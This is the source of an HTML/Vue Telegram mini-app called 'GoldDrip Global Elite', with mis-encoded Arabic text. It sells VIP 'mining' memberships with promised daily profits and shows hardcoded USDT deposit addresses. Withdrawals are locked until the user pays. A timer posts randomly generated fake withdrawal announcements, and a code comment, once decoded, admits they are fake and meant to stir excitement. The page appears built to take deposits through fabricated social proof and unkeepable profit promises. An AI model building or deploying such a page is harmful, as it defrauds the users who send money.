<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GoldDrip Global Elite</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/vue/3.3.4/vue.global.min.js"></script>
    <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/vant@4/lib/index.css" />
    <script src="https://fastly.jsdelivr.net/npm/vant@4/lib/vant.min.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --gold: #FFD700; --dark-bg: #0a0a0a; --glass: rgba(255, 255, 255, 0.05); }
        body { background: var(--dark-bg); color: #fff; font-family: sans-serif; margin: 0; padding-bottom: 120px; overflow-x: hidden; }
        .glass-card { background: var(--glass); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin: 15px; }
        .gold-text { background: linear-gradient(45deg, #FFD700, #B8860B); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: bold; }
        
        /* Ø´Ø±ÙŠØ· Ø§Ù„Ø¥Ø¹Ù„Ø§Ù†Ø§Øª Ø§Ù„Ø¹Ù„ÙˆÙŠ */
        .notice-bar { background: rgba(255, 215, 0, 0.1) !important; color: var(--gold) !important; font-size: 12px !important; height: 35px !important; }

        /* ÙƒØ±ÙˆØª VIP */
        .vip-card { background: linear-gradient(135deg, rgba(255,215,0,0.1) 0%, rgba(0,0,0,0.8) 100%); border: 1px solid rgba(255,215,0,0.2); border-radius: 24px; padding: 20px; margin-bottom: 20px; }
        .price-tag { font-size: 24px; font-weight: bold; color: var(--gold); }

        /* Ø´Ø±ÙŠØ· Ø§Ù„ØªÙ†Ù‚Ù„ Ø§Ù„Ø³ÙÙ„ÙŠ */
        .floating-nav { position: fixed; bottom: 15px; left: 15px; right: 15px; background: rgba(20,20,20,0.95); border-radius: 20px; display: flex; justify-content: space-around; padding: 12px; border: 1px solid #333; z-index: 1000; }
        .nav-item { color: #666; font-size: 11px; text-align: center; }
        .nav-item.active { color: var(--gold); }

        /* ØªØ®ØµÙŠØµ Ø§Ù„Ù†ÙˆØ§ÙØ° Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø© (Ù„Ø§ ØµÙŠÙ†ÙŠ Ø¨Ø¹Ø¯ Ø§Ù„ÙŠÙˆÙ…) */
        .van-dialog { border-radius: 24px !important; background: #fff !important; color: #333 !important; }
        .van-button--default { color: #666 !important; }
        .van-button--primary { color: var(--gold) !important; font-weight: bold !important; }
    </style>
</head>
<body>
<div id="app" v-cloak>
    <van-notice-bar class="notice-bar" left-icon="volume-o" :text="withdrawalNotice" scrollable />

    <div v-if="activeTab === 'home'">
        <div class="glass-card" style="text-align: center;">
            <p style="color: #888; margin:0;">Ø§Ù„Ø±ØµÙŠØ¯ Ø§Ù„Ù…ØªØ§Ø­ Ù„Ù„Ø³Ø­Ø¨</p>
            <h1 class="gold-text" style="font-size: 40px; margin: 10px 0;">${{ (user?.balance || 0).toFixed(4) }}</h1>
            <div style="font-size: 12px; opacity: 0.8;">
                <span class="gold-text">Ù…Ø³ØªÙˆÙ‰ Ø§Ù„Ø¹Ø¶ÙˆÙŠØ©: VIP {{ user?.vip || 0 }}</span> | Ø§Ù„Ø³Ø±Ø¹Ø©: {{ speedMultiplier }}x
            </div>
        </div>

        <div style="text-align: center; margin: 30px 0;">
            <div style="width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--gold); margin: 0 auto; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, rgba(255,215,0,0.2), transparent); cursor: pointer;" @click="mine">
                <i class="fa-solid fa-microchip" style="font-size: 70px; color: var(--gold);"></i>
            </div>
            <p style="margin-top: 15px; font-size: 13px; color: #aaa;">Ø§Ù†Ù‚Ø± Ù‡Ù†Ø§ Ù„ØªÙˆÙ„ÙŠØ¯ Ø§Ù„Ø°Ù‡Ø¨ Ø§Ù„Ø±Ù‚Ù…ÙŠ</p>
        </div>

        <div style="display: flex; gap: 12px; padding: 0 15px;">
            <van-button block round plain color="#FFD700" @click="showWithdraw=true">Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­</van-button>
            <van-button block round color="linear-gradient(to right, #FFD700, #B8860B)" @click="showDeposit=true">
                <span style="color:#000; font-weight:bold">Ø´Ø­Ù† Ø§Ù„Ø±ØµÙŠØ¯</span>
            </van-button>
        </div>
    </div>

    <div v-if="activeTab === 'plans'" style="padding: 15px;">
        <h2 class="gold-text" style="text-align: center; margin-bottom: 20px;">Ù†Ø¸Ø§Ù… ØªØ±Ù‚ÙŠØ© Ø§Ù„Ø£Ø±Ø¨Ø§Ø­ ğŸ‘‘</h2>
        
        <div class="vip-card">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <b>Ø¹Ø¶ÙˆÙŠØ© VIP 1</b>
                <div class="price-tag">$1.00</div>
            </div>
            <p style="font-size: 12px; color: #ccc; margin: 10px 0;">Ø§Ù„Ø±Ø¨Ø­ Ø§Ù„ÙŠÙˆÙ…ÙŠ: <b>$0.15</b> | ØªÙØªØ­ Ù…ÙŠØ²Ø© Ø§Ù„Ø³Ø­Ø¨ ÙÙˆØ±Ø§Ù‹.</p>
            <van-button block size="small" round color="#FFD700" @click="openDepositPlan('1')">
                <span style="color:#000; font-weight:bold">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¹Ø¶ÙˆÙŠØ©</span>
            </van-button>
        </div>

        <div class="vip-card" style="border-color: #00ff00;">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <b>Ø¹Ø¶ÙˆÙŠØ© VIP 2</b>
                <div class="price-tag" style="color:#00ff00;">$5.00</div>
            </div>
            <p style="font-size: 12px; color: #ccc; margin: 10px 0;">Ø§Ù„Ø±Ø¨Ø­ Ø§Ù„ÙŠÙˆÙ…ÙŠ: <b>$1.00</b> | Ø³Ø±Ø¹Ø© ØªØ¹Ø¯ÙŠÙ† ÙØ§Ø¦Ù‚Ø© ÙˆØ³Ù‚Ù Ø³Ø­Ø¨ Ù…Ø±ØªÙØ¹.</p>
            <van-button block size="small" round color="#00ff00" @click="openDepositPlan('5')">
                <span style="color:#000; font-weight:bold">ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¹Ø¶ÙˆÙŠØ©</span>
            </van-button>
        </div>
    </div>

    <van-notice-bar v-if="activeTab === 'home'" style="position:fixed; bottom:85px; width:100%; height:30px; background:rgba(0,0,0,0.8); font-size:10px;" color="#FFD700" text="ØªØ±Ù‚ÙŠØ© Ø­Ø³Ø§Ø¨Ùƒ Ù„Ù€ VIP ØªØ¶Ù…Ù† Ù„Ùƒ Ø£Ø±Ø¨Ø§Ø­Ø§Ù‹ ÙŠÙˆÙ…ÙŠØ© Ù…Ø³ØªÙ‚Ø±Ø© ÙˆØ³Ø­ÙˆØ¨Ø§Øª ÙÙˆØ±ÙŠØ© Ø¨Ø¯ÙˆÙ† Ù‚ÙŠÙˆØ¯!" />

    <div class="floating-nav">
        <div class="nav-item" :class="{active: activeTab==='home'}" @click="activeTab='home'"><i class="fa-solid fa-house"></i><div>Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©</div></div>
        <div class="nav-item" :class="{active: activeTab==='plans'}" @click="activeTab='plans'"><i class="fa-solid fa-gem"></i><div>Ø¹Ø¶ÙˆÙŠØ§Øª VIP</div></div>
        <div class="nav-item" @click="activeTab='about'"><i class="fa-solid fa-shield-halved"></i><div>Ø§Ù„Ø£Ù…Ø§Ù†</div></div>
    </div>

    <van-dialog v-model:show="showDeposit" title="Ø¥ÙŠØ¯Ø§Ø¹ Ø¢Ù…Ù†" show-cancel-button confirm-button-text="ØªØ£ÙƒÙŠØ¯" cancel-button-text="Ø¥Ù„ØºØ§Ø¡" @confirm="confirmDeposit">
        <div style="padding: 20px; color: #333;">
            <p style="font-size:12px; margin-bottom:10px;">Ø§Ø®ØªØ± Ø§Ù„Ø´Ø¨ÙƒØ© Ù„Ø¥Ø¸Ù‡Ø§Ø± Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ø¥ÙŠØ¯Ø§Ø¹:</p>
            <div style="display:flex; gap:10px; margin-bottom:15px;">
                <van-button size="small" block :plain="net!=='TRC20'" color="#26a17b" @click="net='TRC20'">
                    <i class="fa-solid fa-t"></i> USDT (TRC20)
                </van-button>
                <van-button size="small" block :plain="net!=='BEP20'" color="#f3ba2f" @click="net='BEP20'">
                    <i class="fa-solid fa-b"></i> USDT (BEP20)
                </van-button>
            </div>
            <div style="background:#f9f9f9; padding:12px; border-radius:10px; font-size:10px; word-break:break-all; border:1px dashed #FFD700; text-align:center;">
                {{ net==='TRC20' ? 'TEsCEHSkKwWTLLdEuGCHnpf23e8Sv3cZto' : '0x88bea8db94f9428f282b2cc375ec68ac67fd9200' }}
            </div>
            <van-field v-model="tx" label="TXID" placeholder="Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ© (Hash) Ù‡Ù†Ø§" style="margin-top:10px; border:1px solid #eee; border-radius:8px;"></van-field>
        </div>
    </van-dialog>

    <van-dialog v-model:show="showWithdraw" title="Ø³Ø­Ø¨ Ø§Ù„Ø£Ø±Ø¨Ø§Ø­" show-cancel-button confirm-button-text="Ø³Ø­Ø¨" cancel-button-text="Ø¥Ù„ØºØ§Ø¡" @confirm="requestWithdraw">
        <div style="padding: 20px;">
            <van-field v-model="wAmt" label="Ø§Ù„Ù…Ø¨Ù„Øº" type="number" placeholder="Ø£Ù‚Ù„ Ù…Ø¨Ù„Øº 2$"></van-field>
            <van-field v-model="wAddr" label="Ø§Ù„Ù…Ø­ÙØ¸Ø©" placeholder="Ø¹Ù†ÙˆØ§Ù† USDT Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ"></van-field>
        </div>
    </van-dialog>
</div>

<script>
    const { createApp, ref, onMounted, computed } = Vue;
    const { showToast, showDialog } = vant;
    const SERVER = "https://steep-resonance-6443.alaabdalaziz01.workers.dev";
    const ADMIN_ID = "921301895";

    createApp({
        setup() {
            const user = ref({ balance: 0, referralCount: 0, vip: 0 });
            const activeTab = ref('home');
            const userId = ref("");
            const showDeposit = ref(false);
            const showWithdraw = ref(false);
            const net = ref("TRC20");
            const tx = ref("");
            const wAmt = ref("");
            const wAddr = ref("");
            const withdrawalNotice = ref("ØªÙ‡Ù†Ø¦Ø©! Ø§Ù„Ø¹Ø¶Ùˆ User***57 Ø³Ø­Ø¨ 4$ Ø¨Ù†Ø¬Ø§Ø­. | Ø§Ù„Ø¹Ø¶Ùˆ User***12 Ø³Ø­Ø¨ 10$ Ø¨Ù†Ø¬Ø§Ø­.");

            const speedMultiplier = computed(() => (1 + (user.value?.referralCount || 0) * 0.1).toFixed(1));

            onMounted(async () => {
                if (window.Telegram?.WebApp) {
                    const tg = window.Telegram.WebApp;
                    tg.expand();
                    if (tg.initDataUnsafe?.user) {
                        userId.value = tg.initDataUnsafe.user.id;
                        await apiRequest('login');
                    }
                }
                // ØªØ­Ø¯ÙŠØ« Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„Ø³Ø­Ø¨ Ø§Ù„ÙˆÙ‡Ù…ÙŠØ© Ù„Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ø­Ù…Ø§Ø³
                setInterval(() => {
                    const users = ["21", "88", "43", "09", "76"];
                    const amounts = ["2", "5", "12", "7", "20"];
                    withdrawalNotice.value = `ØªÙ‡Ù†Ø¦Ø©! Ø§Ù„Ø¹Ø¶Ùˆ User***${users[Math.floor(Math.random()*5)]} Ø³Ø­Ø¨ ${amounts[Math.floor(Math.random()*5)]}$ Ø¨Ù†Ø¬Ø§Ø­ Ø¹Ø¨Ø± ${net.value}.`;
                }, 10000);
            });

            const apiRequest = async (action, data = {}) => {
                try {
                    const res = await fetch(SERVER, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ action, userId: userId.value, ...data })
                    });
                    const result = await res.json();
                    if (result && !result.error) {
                        user.value = result.balance !== undefined ? result : result.user;
                        return result;
                    } else if (result?.error) showToast(result.error);
                } catch (e) { 
                    console.log("Error details:", e);
                }
            };

            const mine = () => {
                // Ø­Ù„ Ù…Ø´ÙƒÙ„Ø© Ø§Ù„Ø®Ø·Ø£: Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ userId Ù‚Ø¨Ù„ Ø§Ù„Ø·Ù„Ø¨
                if (!userId.value) return showToast("ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª...");
                if (window.Telegram.WebApp.HapticFeedback) window.Telegram.WebApp.HapticFeedback.impactOccurred('medium');
                apiRequest('mine', { amount: 0.01 });
            };

            const openDepositPlan = (price) => {
                showToast(`ÙŠØ±Ø¬Ù‰ Ø¥ÙŠØ¯Ø§Ø¹ ${price}$ Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø®Ø·Ø©`);
                showDeposit.value = true;
            };

            const confirmDeposit = async () => {
                if(!tx.value) return showToast('ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø£ÙˆÙ„Ø§Ù‹');
                await apiRequest('request_deposit', { txId: tx.value, network: net.value });
                showDialog({ message: 'ØªÙ… Ø§Ø³ØªÙ„Ø§Ù… Ø·Ù„Ø¨Ùƒ! Ø³ÙŠØªÙ… Ù…Ø±Ø§Ø¬Ø¹Ø© Ø§Ù„Ù€ TXID ÙˆØªÙØ¹ÙŠÙ„ Ø­Ø³Ø§Ø¨Ùƒ Ø®Ù„Ø§Ù„ Ø¯Ù‚Ø§Ø¦Ù‚ âœ…' });
            };

            const requestWithdraw = async () => {
                if (user.value.vip < 1) return showDialog({ message: 'Ø¹Ø°Ø±Ø§Ù‹! Ø§Ù„Ø³Ø­Ø¨ Ù…ØªØ§Ø­ ÙÙ‚Ø· Ù„Ù…Ø´ØªØ±ÙƒÙŠ VIP 1 Ø£Ùˆ Ø£Ø¹Ù„Ù‰.' });
                await apiRequest('request_withdraw', { amount: wAmt.value, wallet: wAddr.value });
            };

            return { user, activeTab, speedMultiplier, showDeposit, showWithdraw, net, tx, wAmt, wAddr, withdrawalNotice, mine, openDepositPlan, confirmDeposit, requestWithdraw };
        }
    }).use(vant).mount('#app');
</script>
</body>
    </html>
        
